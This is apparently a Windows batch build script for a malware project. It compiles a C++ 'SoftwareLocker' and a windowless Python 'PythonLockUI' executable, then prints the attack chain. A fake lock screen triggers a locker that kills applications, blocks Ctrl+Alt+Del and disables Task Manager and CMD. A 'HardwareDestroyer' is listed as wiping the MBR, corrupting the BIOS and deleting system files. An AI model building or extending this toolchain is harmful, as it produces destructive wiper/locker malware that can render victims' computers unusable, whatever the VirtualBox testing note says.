@echo off
echo ===========================================
echo    BUILD 3 FRAMEWORK SYSTEM
echo ===========================================
echo.

echo 1. COMPILING C++ SOFTWARE LOCKER...
echo.
g++ -o SoftwareLocker.exe SoftwareLocker.cpp
if exist SoftwareLocker.exe (
    echo ✅ SoftwareLocker.exe built successfully!
    echo Size: 
    for /f %%i in ('dir /b SoftwareLocker.exe') do echo   %%i
) else (
    echo ❌ Failed to build SoftwareLocker.exe
    echo Make sure g++ is installed (MinGW)
)

echo.
echo 2. BUILDING PYTHON TO EXE...
echo.
python -m PyInstaller --onefile --noconsole --name "PythonLockUI" "PythonLockUI.py"
if exist dist\PythonLockUI.exe (
    copy dist\PythonLockUI.exe .
    echo ✅ PythonLockUI.exe built successfully!
    echo Size: 
    for /f %%i in ('dir /b PythonLockUI.exe') do echo   %%i
) else (
    echo ❌ Failed to build PythonLockUI.exe
    echo Make sure PyInstaller is installed: pip install pyinstaller
)

echo.
echo 3. CHECKING ALL FILES...
echo.
dir *.exe

echo.
echo ===========================================
echo   READY FILES FOR VIRTUALBOX TESTING:
echo ===========================================
echo.
echo A. PYTHON INTERFACE:
echo    PythonLockUI.exe
echo    - Fullscreen hacker UI
echo    - Password: unlock123  
echo    - 3 attempts → System Lag
echo    - Calls C++ locker
echo.
echo B. C++ SOFTWARE LOCKER:
echo    SoftwareLocker.exe
echo    - Kills all applications
echo    - Blocks: Win+D, Alt+F4, Ctrl+Alt+Del
echo    - Disables Task Manager, CMD
echo    - Keyboard hooks
echo.
echo C. GO HARDWARE DESTROYER:
echo    HardwareDestroyer.exe (already built)
echo    - MBR destruction
echo    - BIOS corruption
echo    - System file deletion
echo    - Force restart
echo.
echo ===========================================
echo   TESTING SEQUENCE:
echo ===========================================
echo 1. Run PythonLockUI.exe (as Admin)
echo 2. Enter wrong password 3 times
echo 3. System Lag activates
echo 4. Python calls SoftwareLocker.exe
echo 5. C++ locks software and keyboard
echo 6. Try to restart → HardwareDestroyer.exe
echo.
echo ⚠️  TEST IN VIRTUALBOX WITH SNAPSHOT!
echo.
pause